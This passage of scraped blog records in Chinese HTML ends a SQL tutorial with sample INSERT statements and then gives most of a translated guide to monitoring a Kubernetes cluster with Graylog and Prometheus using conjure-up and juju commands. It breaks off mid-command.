class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_courses</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">course_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_name</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-25\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'Computing'</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-26\"> </div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-27\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-28\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student1'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">001</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-29\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-30\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student2'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-31\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-32\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student3'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">002</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-33\"><span class=\"crayon-e\">INSERT </span><span class=\"crayon-e\">INTO </span><span class=\"crayon-e\">dbo_students</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">student_id</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">student_name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-v\">course_studied</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-34\"><span class=\"crayon-e\">VALUES</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">004</span><span class=\"crayon-sy\">,</span><span class=\"crayon-s\">'student4'</span><span class=\"crayon-sy\">,</span><span class=\"crayon-cn\">003</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-35\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-36\"><span class=\"crayon-e \">SELECT *</span></div><div class=\"crayon-line\" id=\"crayon-5b4a81f74005d622090945-37\"><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">dbo</span><span class=\"crayon-sy\">_</span>courses</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a81f74005d622090945-38\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0080 seconds] -->\r\n<p></p>\n<h3 id=\"toc_5\">学习更多</h3>\n<p>SQL 并不困难；我认为它比编程简单，并且该语言对于不同的数据库系统是通用的。 请注意，实体关系图中 <code>dbo.&lt;实体&gt;</code> （LCTT 译注：文章中使用的是 <code>dbo_&lt;实体&gt;</code>）不是必需的实体命名约定；我之所以使用，仅仅是因为它是 Microsoft SQL Server 中的标准。</p>\n<p>如果你想了解更多，在网络上这方面的最佳指南是 <a href=\"https://www.w3schools.com/sql/default.asp\">W3Schools.com</a> 中对所有数据库平台的 SQL 综合指南。</p>\n<p>请随意使用我的数据库。另外，如果你有任何建议或疑问，请在评论中回复。</p>\n<p> </p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"113879\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"113879votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"113879\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "tags": "IT技术,数据库", "url": "http://blog.jobbole.com/113879/", "url_obj_id": "fcc6df41d82a46e2ff4b2aa2b977da7e"}
{"front_img_url": ["https://dn-linuxcn.qbox.me/data/attachment/album/201804/10/182842hu1toaq9hhh9uiou.png"], "title": "使用 Graylog 和 Prometheus 监视 Kubernetes 集群", "create_date": "2018/04/13 ·", "praise_num": 1, "fav_num": 2, "comment_num": 2, "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://insights.ubuntu.com/2018/01/16/monitor-your-kubernetes-cluster/\">Kevin Monroe</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9534-1.html\">Linux中国/qhwdw</a>   </div><p>这篇文章最初发表在 <a href=\"https://medium.com/@kwmonroe/monitor-your-kubernetes-cluster-a856d2603ec3\">Kevin Monroe 的博客</a> 上。</p>\n<p>监视日志和指标状态是集群管理员的重点工作。它的好处很明显：指标能帮你设置一个合理的性能目标，而日志分析可以发现影响你工作负载的问题。然而，困难的是如何找到一个与大量运行的应用程序一起工作的监视解决方案。</p>\n<p>在本文中，我将使用 <a href=\"https://www.graylog.org/\">Graylog</a> （用于日志）和 <a href=\"https://prometheus.io/\">Prometheus</a> （用于指标）去打造一个 Kubernetes 集群的监视解决方案。当然了，这不仅是将三个东西连接起来那么简单，实现上，最终结果看起来应该如题图所示：</p>\n<p><img src=\"https://dn-linuxcn.qbox.me/data/attachment/album/201804/10/182842hu1toaq9hhh9uiou.png\" alt=\"\"></p>\n<p>正如你所了解的，Kubernetes 不是一件东西 —— 它由主控节点、工作节点、网络连接、配置管理等等组成。同样，Graylog 是一个配角（apache2、mongodb、等等），Prometheus 也一样（telegraf、grafana 等等）。在部署中连接这些点看起来似乎有些让人恐惧，但是使用合适的工具将不会那么困难。</p>\n<p>我将使用 <a href=\"https://conjure-up.io/\">conjure-up</a> 和 <a href=\"https://jujucharms.com/canonical-kubernetes\">Canonical 版本的 Kubernetes</a> (CDK) 去探索 Kubernetes。我发现 <code>conjure-up</code> 接口对部署大型软件很有帮助，但是我知道一些人可能不喜欢 GUI、TUI 以及其它用户界面。对于这些人，我将用命令行再去部署一遍。</p>\n<p>在开始之前需要注意的一点是，Graylog 和 Prometheus 是部署在 Kubernetes 外侧而不是集群上。像 Kubernetes 仪表盘和 Heapster 是运行的集群的非常好的信息来源，但是我的目标是为日志/指标提供一个分析机制，而不管集群运行与否。</p>\n<h3 id=\"toc_1\">开始探索</h3>\n<p>如果你的系统上没有 <code>conjure-up</code>，首先要做的第一件事情是，请先安装它，在 Linux 上，这很简单：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bc4866564107\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo snap install conjure-up --classic\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bc4866564107-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bc4866564107-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bc4866564107-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">snap </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">conjure</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">up</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-i\">classic</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bc4866564107-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>对于 macOS 用户也提供了 brew 包：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bd0353455312\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nbrew install conjure-up\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bd0353455312-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bd0353455312-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bd0353455312-1\"><span class=\"crayon-e\">brew </span><span class=\"crayon-e\">install </span><span class=\"crayon-v\">conjure</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">up</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bd0353455312-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>你需要最新的 2.5.2 版，它的好处是添加了 CDK spell，因此，如果你的系统上已经安装了旧的版本，请使用 <code>sudo snap refresh conjure-up</code> 或者 <code>brew update &amp;&amp; brew upgrade conjure-up</code> 去更新它。</p>\n<p>安装完成后，运行它：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bd5014245195\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nconjure-up\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bd5014245195-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bd5014245195-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bd5014245195-1\"><span class=\"crayon-v\">conjure</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">up</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bd5014245195-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/0a84a2dc6e19e9e92a195dbe6c5eb6b1.png\" alt=\"\"></p>\n<p>你将发现有一个 spell 列表。选择 CDK 然后按下回车。</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/5c2e2762a0bb2a81dd5939d4a657c69d.png\" alt=\"\"></p>\n<p>这个时候，你将看到 CDK spell 可用的附加组件。我们感兴趣的是 Graylog 和 Prometheus，因此选择这两个，然后点击 “Continue”。</p>\n<p>它将引导你选择各种云，以决定你的集群部署的地方。之后，你将看到一些部署的后续步骤，接下来是回顾屏幕，让你再次确认部署内容：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/e8a7154940f22e1ee5c1035698a2fab3.png\" alt=\"\"></p>\n<p>除了典型的 K8s 相关的应用程序（etcd、flannel、load-balancer、master 以及 workers）之外，你将看到我们选择的日志和指标相关的额外应用程序。</p>\n<p>Graylog 栈包含如下：</p>\n<ul>\n<li>apache2：graylog web 界面的反向代理</li>\n<li>elasticsearch：日志使用的文档数据库</li>\n<li>filebeat：从 K8s master/workers 转发日志到 graylog</li>\n<li>graylog：为日志收集器提供一个 api，以及提供一个日志分析界面</li>\n<li>mongodb：保存 graylog 元数据的数据库</li>\n</ul>\n<p>Prometheus 栈包含如下：</p>\n<ul>\n<li>grafana：指标相关的仪表板的 web 界面</li>\n<li>prometheus：指标收集器以及时序数据库</li>\n<li>telegraf：发送主机的指标到 prometheus 中</li>\n</ul>\n<p>你可以在回顾屏幕上微调部署，但是默认组件是必选 的。点击 “Deploy all Remaining Applications” 继续。</p>\n<p>部署工作将花费一些时间，它将部署你的机器和配置你的云。完成后，<code>conjure-up</code> 将展示一个摘要屏幕，它包含一些链接，你可以用你的终端去浏览各种感兴趣的内容：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/77927d348a0c12ef4855bd1116947ef5.png\" alt=\"\"></p>\n<h4 id=\"toc_2\">浏览日志</h4>\n<p>现在，Graylog 已经部署和配置完成，我们可以看一下采集到的一些数据。默认情况下，filebeat 应用程序将从 Kubernetes 的 master 和 worker 中转发系统日志（ <code>/var/log/*.log</code> ）和容器日志（<code>/var/log/containers/*.log</code>）到 graylog 中。</p>\n<p>记住如下的 apache2 的地址和 graylog 的 admin 密码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8bda336949098\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\njuju status --format yaml apache2/0 | grep public-address\r\n public-address: &lt;your-apache2-ip&gt;\r\njuju run-action --wait graylog/0 show-admin-password\r\n admin-password: &lt;your-graylog-password&gt;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bda336949098-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bda336949098-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4a92b1d8bda336949098-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4a92b1d8bda336949098-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bda336949098-1\"><span class=\"crayon-e\">juju </span><span class=\"crayon-v\">status</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">format </span><span class=\"crayon-e\">yaml </span><span class=\"crayon-v\">apache2</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">grep </span><span class=\"crayon-m\">public</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">address</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bda336949098-2\"><span class=\"crayon-e\"> </span><span class=\"crayon-m\">public</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">address</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">apache2</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">ip</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5b4a92b1d8bda336949098-3\"><span class=\"crayon-e\">juju </span><span class=\"crayon-v\">run</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">action</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-e\">wait </span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">show</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">admin</span><span class=\"crayon-o\">-</span><span class=\"crayon-e\">password</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4a92b1d8bda336949098-4\"><span class=\"crayon-e\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">your</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">graylog</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">password</span><span class=\"crayon-o\">&gt;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0013 seconds] -->\r\n<p>在浏览器中输入 <code>http://&lt;your-apache2-ip&gt;</code> ，然后以管理员用户名（admin）和密码（&lt;your-graylog-password&gt;）登入。</p>\n<p><strong>注意：</strong> 如果这个界面不可用，请等待大约 5 分钟时间，以便于配置的反向代理生效。</p>\n<p>登入后，顶部的 “Sources” 选项卡可以看到从 K8s 的 master 和 workers 中收集日志的概述：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/8e0dc56257a324ee2f0f33426b3c105e.png\" alt=\"\"></p>\n<p>通过点击 “System / Inputs” 选项卡深入这些日志，选择 “Show received messages” 查看 filebeat 的输入：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/04/6b187118ff50bc41d040ef954b607ffe.png\" alt=\"\"></p>\n<p>在这里，你可以应用各种过滤或者设置 Graylog 仪表板去帮助识别大多数比较重要的事件。查看 <a href=\"http://docs.graylog.org/en/2.3/pages/dashboards.html\">Graylog Dashboard</a> 文档，可以了解如何定制你的视图的详细资料。</p>\n<h4 id=\"toc_3\">浏览指标</h4>\n<p>我们的部署通过 grafana 仪表板提供了两种类型的指标：系统指标，包括像 K8s master 和 worker 的 CPU /内存/磁盘使用情况，以及集群指标，包括像从 K8s cAdvisor 端点上收集的容器级指标。</p>\n<p>记住如下的 grafana 的地址和 admin 密码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4a92b1d8be0589064741\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\njuju status --format 